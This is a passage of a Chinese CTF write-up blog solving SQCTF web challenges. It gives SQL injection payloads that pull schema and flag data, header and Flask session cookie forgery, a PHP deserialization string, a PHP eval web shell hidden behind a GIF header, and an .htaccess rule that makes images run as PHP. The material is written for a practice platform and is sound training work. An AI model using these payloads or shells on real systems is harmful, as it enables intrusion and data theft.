+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">31757</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = users)))--+</span></span><br><span class="line"><span class="string">错误：未正常包裹</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://challenge.qsnctf.com:30902/?id=1&#x27;</span> <span class="keyword">OR</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>, (<span class="keyword">SELECT</span> GROUP_CONCAT(column_name) <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;users&#x27;</span>)))<span class="comment">--+</span></span><br><span class="line">错误，返回的不一定是这个数据库的内容</span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">31586</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name = &#x27;</span>users<span class="string">&#x27; AND table_schema = DATABASE())))--+</span></span><br><span class="line"><span class="string">正确，补充说明为这个库</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410172901401-1744277342056-15.png" alt="image-20250410172901401"></p>
+<p><img src="/../images/image-20250410185151412-1744282312719-19.png" alt="image-20250410185151412"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">31586</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT group_concat(password) FROM users)))--+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="好像。。。没什么用？"><a href="#好像。。。没什么用？" class="headerlink" title="好像。。。没什么用？"></a>好像。。。没什么用？</h3><p><img src="/../images/image-20250410190223578-1744282944709-21.png" alt="image-20250410190223578"></p>
+<h3 id="问ai才知道就返回了一半"><a href="#问ai才知道就返回了一半" class="headerlink" title="问ai才知道就返回了一半"></a>问ai才知道就返回了一半</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">31667</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING( (SELECT GROUP_CONCAT(username) FROM users), 30, 60 )))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410192854983-1744284535673-23.png" alt="image-20250410192854983"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://challenge.qsnctf.com:31667/?id=1&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, SUBSTRING( (SELECT GROUP_CONCAT(password) FROM users), 310, 340 )))--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410193201002-1744284722358-25.png" alt="image-20250410193201002"></p>
+<p><strong>啊？没有！！</strong></p>
+<h3 id="看来得查看有没有别的库了！！"><a href="#看来得查看有没有别的库了！！" class="headerlink" title="看来得查看有没有别的库了！！"></a><strong>看来得查看有没有别的库了！！</strong></h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(schema_name) FROM information_schema.schemata)))--+</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">OR</span> EXTRACTVALUE(<span class="number">1</span>, CONCAT(<span class="number">0x7e</span>, <span class="built_in">SUBSTRING</span>( (<span class="keyword">SELECT</span> GROUP_CONCAT(schema_name) <span class="keyword">FROM</span> information_schema.schemata),  <span class="number">30</span>, <span class="number">60</span>)))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410195349490-1744286030269-27.png" alt="image-20250410195349490"></p>
+<p><img src="/../images/image-20250410201534447-1744287335254-35-1744287335571-37.png" alt="image-20250410201534447"></p>
+<p>果然在别的库！</p>
+<h3 id="找别的表："><a href="#找别的表：" class="headerlink" title="找别的表："></a>找别的表：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">32378</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema = &#x27;</span>ctf<span class="string">&#x27;)))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410195441105-1744286081834-29.png" alt="image-20250410195441105"></p>
+<h3 id="找列"><a href="#找列" class="headerlink" title="找列"></a>找列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">32378</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_schema = &#x27;</span>ctf<span class="string">&#x27; AND table_name = &#x27;</span>flag<span class="string">&#x27;)))--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410195906816-1744286347734-31.png" alt="image-20250410195906816"></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">32378</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM ctf.flag LIMIT 1), 0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<p>突然释怀的死了：（不是，<font color="red">出题人你有病啊</font></p>
+<p><img src="/../images/image-20250410201225378-1744287145968-33.png" alt="image-20250410201225378"></p>
+<h3 id="我就不信了！"><a href="#我就不信了！" class="headerlink" title="我就不信了！"></a>我就不信了！</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">30225</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;  UNION SELECT 1, 2,COUNT(*) </span></span><br><span class="line"><span class="string">FROM information_schema.COLUMNS </span></span><br><span class="line"><span class="string">WHERE COLUMN_NAME LIKE &#x27;</span><span class="operator">%</span>flag<span class="operator">%</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>测试有几个：</p>
+<p><img src="/../images/image-20250410205027535-1744289429509-39.png" alt="image-20250410205027535"></p>
+<h3 id="尝试过程！！！！！"><a href="#尝试过程！！！！！" class="headerlink" title="尝试过程！！！！！"></a>尝试过程！！！！！</h3><p>寻找列的名字：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">30225</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27;  UNION SELECT 1, 2,CONCAT(&#x27;</span><span class="keyword">Table</span>: <span class="string">&#x27;, TABLE_NAME, &#x27;</span> <span class="operator">-</span> <span class="keyword">Column</span>: <span class="string">&#x27;, COLUMN_NAME) FROM information_schema.COLUMNS WHERE COLUMN_NAME LIKE &#x27;</span><span class="operator">%</span>flag<span class="operator">%</span><span class="string">&#x27; LIMIT 1 OFFSET 0--+</span></span><br><span class="line"><span class="string">通过修改OFFSET来测试第几个</span></span><br></pre></td></tr></table></figure>
+
+<p>可先通过下面代码测试有几个</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT COUNT(*) </span></span><br><span class="line"><span class="string">FROM information_schema.COLUMNS </span></span><br><span class="line"><span class="string">WHERE COLUMN_NAME LIKE &#x27;</span><span class="operator">%</span>SQ<span class="operator">%</span><span class="string">&#x27;--+</span></span><br></pre></td></tr></table></figure>
+
+<p>都不行。。不如从头再来一遍吧！ctfer不怕困难！</p>
+<h3 id="最终payload："><a href="#最终payload：" class="headerlink" title="最终payload："></a>最终payload：</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">30225</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; UNION SELECT 1,2,group_concat(concat_ws(&#x27;</span><span class="operator">/</span><span class="string">&#x27;,id,value)) from ctf.flag--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250410211657524-1744291018526-41.png" alt="image-20250410211657524"></p>
+<p>不是哥们，为什么上面的可以返回，下面的不可以</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">32378</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM ctf.flag LIMIT 1), 0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQCTF&#123;66a47fc2-cf6e-7648-b523-d29363b5580c&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>后面发现，只需要改为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>challenge.qsnctf.com:<span class="number">30225</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; OR EXTRACTVALUE(1, CONCAT(0x7e, (SELECT value FROM ctf.flag LIMIT 1 OFFSET 1), 0x7e))--+</span></span><br></pre></td></tr></table></figure>
+
+<p>就可以读出来了。。。。</p>
+<p><img src="/../images/image-20250410212333293-1744291414420-43.png" alt="image-20250410212333293"></p>
+<p><strong>有意思！！！</strong></p>
+<h1 id="Are-you-from-SQNU"><a href="#Are-you-from-SQNU" class="headerlink" title="Are you from SQNU?"></a>Are you from SQNU?</h1><p><font color="red">https的构造</font></p>
+<h3 id="1-post构造："><a href="#1-post构造：" class="headerlink" title="1.post构造："></a>1.post构造：</h3><p><img src="/../images/image-20250411152252559-1744356173541-4.png" alt="image-20250411152252559"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST：</span><br><span class="line">tyctf=<span class="number">1</span>&amp;hhh=abc</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-Referer构造"><a href="#2-Referer构造" class="headerlink" title="2.Referer构造"></a>2.Referer构造</h3><p>抓包构造：</p>
+<p><img src="/../images/image-20250411152343667-1744356224526-6.png" alt="image-20250411152343667"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: https:<span class="comment">//sqnu-tysec.com</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250411152436844-1744356277464-8.png" alt="image-20250411152436844"></p>
+<h3 id="3-User-Agent（浏览器）构造"><a href="#3-User-Agent（浏览器）构造" class="headerlink" title="3.User-Agent（浏览器）构造"></a>3.User-Agent（浏览器）构造</h3><p><img src="/../images/image-20250411152520272-1744356321310-10.png" alt="image-20250411152520272"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: TYsecBrowser</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="4-本地伪造"><a href="#4-本地伪造" class="headerlink" title="4.本地伪造"></a>4.本地伪造</h3><p><img src="/../images/image-20250411152840686-1744356521715-12.png" alt="image-20250411152840686"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250411222655672-1744381616403-16.png" alt="image-20250411222655672"></p>
+<h3 id="5-cookie伪造"><a href="#5-cookie伪造" class="headerlink" title="5.cookie伪造"></a>5.cookie伪造</h3><p><img src="/../images/image-20250411222930207-1744381771192-18.png" alt="image-20250411222930207"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: user=admin</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;a807404102144dc09321556b1f1e5e04&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="伪装："><a href="#伪装：" class="headerlink" title="伪装："></a>伪装：</h1><p>考察点：<font color="red">cookie伪造</font></p>
+<p>源码：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, request, render_template_string</span><br><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;love&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;role&#x27;</span>] = &#123;</span><br><span class="line">        <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;aiyamaya&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(__file__, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        code = file.read()</span><br><span class="line">    <span class="keyword">return</span> code</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin_handler</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(role, <span class="built_in">dict</span>):</span><br><span class="line">            <span class="keyword">raise</span> Exception</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Without you, you are an intruder!&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> role.get(<span class="string">&#x27;is_admin&#x27;</span>) == <span class="number">1</span> <span class="keyword">and</span> role.get(<span class="string">&#x27;name&#x27;</span>) == <span class="string">&#x27;sjx&#x27;</span>:</span><br><span class="line">        flag = os.popen(<span class="string">&quot;cat /flag&quot;</span>).read()</span><br><span class="line">        message = <span class="string">&quot;Oh, You get me! The flag is: %s&quot;</span> % flag</span><br><span class="line">        <span class="keyword">return</span> render_template_string(message)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Error: You don&#x27;t have the power!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="1-代码解析："><a href="#1-代码解析：" class="headerlink" title="1.代码解析："></a>1.代码解析：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">role = session.get(<span class="string">&#x27;role&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>创造session</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if role.get(&#x27;is_admin&#x27;) == 1 and role.get(&#x27;name&#x27;) == &#x27;sjx&#x27;</span><br></pre></td></tr></table></figure>
+
+<p><strong><code>session</code>中两个对象名字要是对了就执行<code>cat /flag</code></strong></p>
+<p>简简单单的cookie伪造：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1.下载工具箱：</span><br><span class="line">pip install flask-unsign</span><br><span class="line"></span><br><span class="line">2.构造：</span><br><span class="line">flask-unsign --sign --cookie &quot;&#123;&#x27;role&#x27;: &#123;&#x27;is_admin&#x27;: 1, &#x27;name&#x27;: &#x27;sjx&#x27;&#125;&#125;&quot; --secret &#x27;love&#x27;</span><br><span class="line"></span><br><span class="line">3.发送cookie（懒得抓包了）</span><br><span class="line">C:\Users\朔星&gt;curl -H &quot;Cookie: session=eyJyb2xlIjp7ImlzX2FkbWluIjoxLCJuYW1lIjoic2p4In19.Z_jIaw.G1zAlHDjHnzF67MZd4MWcS9JoiY&quot; http://challenge.qsnctf.com:31912/admin</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Oh, You get me! The flag <span class="keyword">is</span>: sqctf&#123;0daeaa5589454f40b70376fa3d976f79&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="哎呀大大大黑塔"><a href="#哎呀大大大黑塔" class="headerlink" title="哎呀大大大黑塔"></a>哎呀大大大黑塔</h1><p>出这题的意义是什么？</p>
+<p>输入Bv号得到源码，输入反序列化即可：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data=O:<span class="number">6</span>:<span class="string">&quot;Secret&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;key&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;SQCTF&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="upload2"><a href="#upload2" class="headerlink" title="upload2"></a>upload2</h1><h3 id="修改头文件就行："><a href="#修改头文件就行：" class="headerlink" title="修改头文件就行："></a>修改头文件就行：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">GIF89a</span><br><span class="line">&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#x27;cmd&#x27;])&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="剑蚁链接"><a href="#剑蚁链接" class="headerlink" title="剑蚁链接"></a>剑蚁链接</h3><p><img src="/../images/image-20250411171941681-1744363182435-14.png" alt="image-20250411171941681"></p>
+<p>得到flag；</p>
+<p>之前忘记写flag了，现在补一下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="ggoodd"><a href="#ggoodd" class="headerlink" title="ggoodd"></a>ggoodd</h1><p>写个脚本：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.qsnctf.com:30525/&quot;</span>  # 替换为实际的目标 <span class="variable constant_">URL</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;id&quot;</span>: <span class="string">&quot;abc&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">params = &#123;</span><br><span class="line">    <span class="string">&quot;json&quot;</span>: <span class="string">&#x27;&#123;&quot;x&quot;: &quot;cba&quot;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.<span class="title function_">post</span>(url, data=data, params=params)</span><br><span class="line"><span class="title function_">print</span>(response.<span class="property">text</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;f681df505d114e11a0396603da15bf1c&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="计算题"><a href="#计算题" class="headerlink" title="计算题"></a>计算题</h1><h3 id="写一个脚本就行："><a href="#写一个脚本就行：" class="headerlink" title="写一个脚本就行："></a>写一个脚本就行：</h3><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&#x27;http://challenge.qsnctf.com:30650/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送 GET 请求获取初始页面</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">content = r.text</span><br><span class="line">soup = BeautifulSoup(content, <span class="string">&#x27;html.parser&#x27;</span>)  <span class="comment"># 使用内置解析器避免 lxml 缺失问题</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 提取数学表达式（位于 class=&quot;challenge&quot; 的 div 中）</span></span><br><span class="line">challenge_div = soup.find(<span class="string">&#x27;div&#x27;</span>, class_=<span class="string">&#x27;challenge&#x27;</span>)</span><br><span class="line">expression = challenge_div.get_text().strip()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 计算表达式结果</span></span><br><span class="line">result = <span class="built_in">eval</span>(expression)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 提交计算结果（注意表单字段名是 &#x27;value&#x27;）</span></span><br><span class="line">post_response = s.post(url, data=&#123;<span class="string">&#x27;value&#x27;</span>: result&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 解析成功页面，获取 /flag 路径（或直接拼接 URL）</span></span><br><span class="line"><span class="comment"># 这里直接访问 /flag，因为 href 是相对路径</span></span><br><span class="line">flag_url = url + <span class="string">&#x27;flag&#x27;</span>  <span class="comment"># 或使用 urljoin 更严谨：from urllib.parse import urljoin; flag_url = urljoin(url, &#x27;/flag&#x27;)</span></span><br><span class="line">flag_response = s.get(flag_url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 打印 Flag（可能在页面中直接显示）</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Flag 是：&quot;</span>, flag_response.text)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;90c050ee06fe46f88efc062b5fca0338&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="图片展示功能"><a href="#图片展示功能" class="headerlink" title="图片展示功能"></a>图片展示功能</h1><h3 id="考察点：配置文件冲突"><a href="#考察点：配置文件冲突" class="headerlink" title="考察点：配置文件冲突"></a>考察点：<font color="red">配置文件冲突</font></h3><h3 id="直接上传一个htaccess文件就行："><a href="#直接上传一个htaccess文件就行：" class="headerlink" title="直接上传一个htaccess文件就行："></a>直接上传一个htaccess文件就行：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------geckoformboundaryaf67d0729606b7673f9c9cc1df4c9ca0</span><br><span class="line">Content-Disposition: form-data; name=&quot;upload_file&quot;; filename=&quot;.htaccess&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;FilesMatch &quot;\.(jpg|jpeg)$&quot;&gt;</span><br><span class="line">    SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/image-20250413091117865-1744506678514-1.png" alt="image-20250413091117865"></p>
+<p>再上传222.jpg就行</p>
+<p><img src="/../images/image-20250413091151566-1744506712238-3.png" alt="image-20250413091151566"></p>
+<p>链接得flag：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqctf&#123;1dc6e44118234c66ad971afbc5a0d774&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="有坑："><a href="#有坑：" class="headerlink" title="有坑："></a>有坑：</h3><p>不能在<code>htaccess头部</code>加上任何修饰</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> width 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> height 1</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> bits[] = &#123; <span class="number">0x00</span> &#125;;</span><br><span class="line">都不行！！！！</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="Pickle"><a href="#Pickle" class="headerlink" title="Pickle"></a>Pickle</h1><h3 id="考察点：EZ反序列化"><a href="#考察点：EZ反序列化" class="headerlink" title="考察点：EZ反序列化"></a>考察点：<font color="red">EZ反序列化</font></h3><h3 id="写在前面："><a href="#写在前面：" class="headerlink" title="写在前面："></a>写在前面：</h3><p>我真的服了，你加你那n干什么，</p>
+<p><img src="/../images/image-20250413102039282-1744510840106-5.png" alt="image-20250413102039282"></p>
+<p>害的我查了那么久的<font color="red">&#x2F;nflag！！！！！！</font></p>
+<h3 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h3><p>写一个反序列化脚本就行：</p>
